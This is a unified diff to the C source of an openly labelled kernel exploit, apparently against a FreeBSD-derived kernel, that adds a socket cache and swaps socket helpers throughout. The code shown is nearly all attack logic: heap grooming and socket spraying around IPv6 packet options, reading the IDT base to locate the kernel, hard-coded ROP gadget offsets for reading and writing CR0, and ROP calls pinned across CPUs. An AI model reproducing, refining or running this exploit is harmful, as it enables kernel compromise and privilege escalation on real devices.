@@ -45,6 +45,88 @@
 #define PKTOPTS_RTHDR_OFFSET (offsetof(struct ip6_pktopts, ip6po_rhinfo.ip6po_rhi_rthdr))
 #define PKTOPTS_TCLASS_OFFSET (offsetof(struct ip6_pktopts, ip6po_tclass))
 
+// Reusable socket cache
+#define SOCKET_CACHE_SIZE 64
+static int socket_cache[SOCKET_CACHE_SIZE];
+static int socket_cache_idx = 0;
+static int socket_cache_initialized = 0;
+
+// Start socket cache with -1
+void init_socket_cache(void) {
+    for (int i = 0; i < SOCKET_CACHE_SIZE; i++) {
+        socket_cache[i] = -1;
+    }
+    socket_cache_idx = 0;
+    socket_cache_initialized = 1;
+}
+
+void reset_ipv6_opts(int s) {
+    static const int tclass = -1;
+    static const struct in6_pktinfo z = {0};
+
+    setsockopt(s, IPPROTO_IPV6, IPV6_TCLASS, &tclass, sizeof(tclass));
+    setsockopt(s, IPPROTO_IPV6, IPV6_RTHDR, NULL, 0);
+    setsockopt(s, IPPROTO_IPV6, IPV6_PKTINFO, &z, sizeof(z));
+}
+
+void safe_close_socket(int sock) {
+    if (sock >= 0) {
+        reset_ipv6_opts(sock);
+        shutdown(sock, SHUT_RDWR);
+        close(sock);
+    }
+}
+
+// Use socket cache if available
+int fast_new_socket(void) {
+    if (!socket_cache_initialized) {
+        init_socket_cache();
+    }
+
+    if (socket_cache_idx < SOCKET_CACHE_SIZE && socket_cache[socket_cache_idx] >= 0) {
+        // Return socket cache
+        int sock = socket_cache[socket_cache_idx];
+        socket_cache[socket_cache_idx] = -1;
+        socket_cache_idx++;
+        return sock;
+    }
+
+    // Create new socket if empty cache
+    return socket(AF_INET6, SOCK_DGRAM, 0);
+}
+
+// Store socket cache
+void cache_socket(int sock) {
+    if (sock < 0) return;
+
+    if (!socket_cache_initialized) {
+        init_socket_cache();
+    }
+
+    // Reset IPv6 options
+    reset_ipv6_opts(sock);
+
+    if (socket_cache_idx > 0) {
+        // Save to cache
+        socket_cache_idx--;
+        socket_cache[socket_cache_idx] = sock;
+    } else {
+        // Full cache, close
+        safe_close_socket(sock);
+    }
+}
+
+// Clear Cache
+void flush_socket_cache(void) {
+    for (int i = 0; i < SOCKET_CACHE_SIZE; i++) {
+        if (socket_cache[i] >= 0) {
+            safe_close_socket(socket_cache[i]);
+            socket_cache[i] = -1;
+        }
+    }
+    socket_cache_idx = 0;
+}
+
 #define GET_TCLASS(name) \
 int name(int s) { \
     int v; \
@@ -74,24 +156,10 @@ typedef struct {
     int spray_count;
 } exploit_state_t;
 
-void reset_ipv6_opts(int s) {
-    static const int tclass = -1;
-    static const struct in6_pktinfo z = {0};
-
-    setsockopt(s, IPPROTO_IPV6, IPV6_TCLASS, &tclass, sizeof(tclass));
-    setsockopt(s, IPPROTO_IPV6, IPV6_RTHDR, NULL, 0);
-    setsockopt(s, IPPROTO_IPV6, IPV6_PKTINFO, &z, sizeof(z));
-}
-
-void safe_close_socket(int sock) {
-    if (sock >= 0) {
-        reset_ipv6_opts(sock);
-        shutdown(sock, SHUT_RDWR);
-        close(sock);
-    }
-}
-
 void comprehensive_cleanup(exploit_state_t* state) {
+    // Reset cache first
+    flush_socket_cache();
+
     for (int i = 0; i < state->spray_count; i++) {
         if (state->spray_sock[i] >= 0) {
             reset_ipv6_opts(state->spray_sock[i]);
@@ -100,12 +168,12 @@ void comprehensive_cleanup(exploit_state_t* state) {
             state->spray_sock[i] = -1;
         }
     }
-    
+
     safe_close_socket(state->master_sock);
     safe_close_socket(state->kevent_sock);
     state->master_sock = -1;
     state->kevent_sock = -1;
-    
+
     nanosleep(NANOSLEEP_100US, NULL);
 }
 
@@ -114,7 +182,7 @@ void stabilize_kernel_memory() {
         int stabilization_sockets[64];
 
         for (int i = 0; i < 64; i++) {
-            stabilization_sockets[i] = new_socket();
+            stabilization_sockets[i] = fast_new_socket();  // Usar fast_new_socket
             if (stabilization_sockets[i] >= 0) {
                 reset_ipv6_opts(stabilization_sockets[i]);
             }
@@ -123,7 +191,7 @@ void stabilize_kernel_memory() {
         nanosleep(NANOSLEEP_100US, NULL);
 
         for (int i = 63; i >= 0; i--) {
-            safe_close_socket(stabilization_sockets[i]);
+            cache_socket(stabilization_sockets[i]);  // Usar cache_socket em vez de safe_close
         }
 
         nanosleep(NANOSLEEP_100US, NULL);
@@ -139,7 +207,6 @@ struct opaque {
     int kevent_sock;
     int* spray_sock;
 };
-
 
 void pin_to_cpu(int cpu) {
     cpuset_t set;
@@ -295,7 +362,7 @@ void aggressive_heap_reclamation() {
 
         // Allocate many sockets to fill in fragmented holes
         for (int i = 0; i < AGGRESSIVE_SOCKETS_PER_PASS; i++) {
-            reclaim_sockets[i] = new_socket();
+            reclaim_sockets[i] = fast_new_socket();  // Usar fast_new_socket
             if (reclaim_sockets[i] >= 0) {
                 created_count++;
                 reset_ipv6_opts(reclaim_sockets[i]);
@@ -310,7 +377,7 @@ void aggressive_heap_reclamation() {
         // Close in reverse order to allow proper coalescing
         for (int i = created_count - 1; i >= 0; i--) {
             if (reclaim_sockets[i] >= 0)
-                safe_close_socket(reclaim_sockets[i]);
+                cache_socket(reclaim_sockets[i]);  // Usar cache_socket
         }
 
         nanosleep(NANOSLEEP_75US, NULL);
@@ -322,7 +389,7 @@ void flush_ipv6_option_pools() {
     int flush_sockets[128];
 
     for (int i = 0; i < 128; i++) {
-        flush_sockets[i] = new_socket();
+        flush_sockets[i] = fast_new_socket();  // Use fast_new_socket
         if (flush_sockets[i] >= 0) {
             // Set and immediately unset options to exercise kernel cleanup paths
             char dummy[256] = {0};
@@ -337,7 +404,7 @@ void flush_ipv6_option_pools() {
 
     for (int i = 127; i >= 0; i--) {
         if (flush_sockets[i] >= 0)
-            safe_close_socket(flush_sockets[i]);
+            cache_socket(flush_sockets[i]);  // Use cache_socket
     }
 
     nanosleep(NANOSLEEP_100US, NULL);
@@ -359,7 +426,6 @@ void validate_and_repair_kernel_structures() {
         }
     }
 }
-
 
 int verify_idt(unsigned long long expected_base) {
     unsigned long long current_base;
@@ -391,7 +457,7 @@ void restore_kernel_state() {
         } else {
             stabilize_kernel_memory();
         }
-        
+
         nanosleep(NANOSLEEP_10US, NULL);
     }
 }
@@ -419,15 +485,18 @@ extern char spray_bin[];
 extern char spray_end[];
 
 int main() {
+    // Initialize sockets cache
+    init_socket_cache();
+
     if (!setuid(0))
         return 179;
 
     save_kernel_state();
-    
-    for (int i = 0; i < 16; i++)
-        new_socket();
 
-    uint64_t idt_base;
+    for (int i = 0; i < 16; i++)
+        fast_new_socket();  // Use fast_new_socket
+
+        uint64_t idt_base;
     uint16_t idt_size;
     sidt(&idt_base, &idt_size);
 
@@ -439,22 +508,22 @@ int main() {
     krop_read_cr0_2 = kernel_base + 0xa1b70;
     krop_write_cr0 = kernel_base + 0xa1b79;
 
-    int kevent_sock = new_socket();
-    int master_sock = new_socket();
+    int kevent_sock = fast_new_socket();
+    int master_sock = fast_new_socket();
     krop_master_sock = master_sock * 8;
 
     // Heap grooming
     for (int i = 0; i < HEAP_GROOM_COUNT; i++) {
-        int temp_sock = new_socket();
+        int temp_sock = fast_new_socket();
         reset_ipv6_opts(temp_sock);
-        safe_close_socket(temp_sock);
+        cache_socket(temp_sock);  // Use cache_socket
         if (i % 10 == 0)
             nanosleep(NANOSLEEP_75US, NULL);
     }
 
     int spray_sock[SPRAY_TOTAL];
     for (int i = 0; i < SPRAY_TOTAL; i++) {
-        spray_sock[i] = new_socket();
+        spray_sock[i] = fast_new_socket();  // Use fast_new_socket
         if (spray_sock[i] < 0)
             *(volatile int*)0;
     }
@@ -473,7 +542,7 @@ int main() {
     };
 
     int exploit_success = 0;
-    
+
     for (int attempts = 0; attempts < MAX_ATTEMPTS; attempts++) {
         int overlap_idx = -1;
 
@@ -495,8 +564,8 @@ int main() {
             continue;
 
         int overlap_sock = spray_sock[overlap_idx];
-        safe_close_socket(overlap_sock);
-        spray_sock[overlap_idx] = new_socket();
+        cache_socket(overlap_sock);
+        spray_sock[overlap_idx] = fast_new_socket();
         if (spray_sock[overlap_idx] < 0)
             *(volatile int*)0;
 
@@ -505,8 +574,8 @@ int main() {
             continue;
 
         overlap_sock = spray_sock[overlap_idx];
-        safe_close_socket(overlap_sock);
-        spray_sock[overlap_idx] = new_socket();
+        cache_socket(overlap_sock);
+        spray_sock[overlap_idx] = fast_new_socket();
         if (spray_sock[overlap_idx] < 0)
             *(volatile int*)0;
 
@@ -552,28 +621,28 @@ int main() {
         spray_map[i] = spray_bin[i];
         if (i % 4096 == 0) nanosleep(NANOSLEEP_50US, NULL);
     }
-	
-	if (exploit_success) {
-		pin_to_cpu(2);
-		rop_call_funcptr(spray_map, spray_sock, kernel_base);
 
-		for (int cpu = 3; cpu <= 7; cpu++) {
-			pin_to_cpu(cpu);
-			rop_call_funcptr(spray_map, NULL, kernel_base);
-		}
-		
-		nanosleep(NANOSLEEP_50US, NULL);
-		
-		for (int post_krop_pass = 0; post_krop_pass < POST_KROP_CLEANUP_PASSES; post_krop_pass++) {
-			aggressive_heap_reclamation();
-			
-			if (post_krop_pass % 2 == 1) {
-				flush_ipv6_option_pools();
-			}
-			
-			nanosleep(NANOSLEEP_100US, NULL);
-		}
-	}
+    if (exploit_success) {
+        pin_to_cpu(2);
+        rop_call_funcptr(spray_map, spray_sock, kernel_base);
+
+        for (int cpu = 3; cpu <= 7; cpu++) {
+            pin_to_cpu(cpu);
+            rop_call_funcptr(spray_map, NULL, kernel_base);
+        }
+
+        nanosleep(NANOSLEEP_50US, NULL);
+
+        for (int post_krop_pass = 0; post_krop_pass < POST_KROP_CLEANUP_PASSES; post_krop_pass++) {
+            aggressive_heap_reclamation();
+
+            if (post_krop_pass % 2 == 1) {
+                flush_ipv6_option_pools();
+            }
+
+            nanosleep(NANOSLEEP_100US, NULL);
+        }
+    }
 
     validate_and_repair_kernel_structures();
 
@@ -584,7 +653,6 @@ int main() {
     comprehensive_cleanup(&cleanup_state);
     aggressive_heap_reclamation();
     nanosleep(NANOSLEEP_10US, NULL);
-    
+
     return exploit_success ? 0 : 1;
 }
-
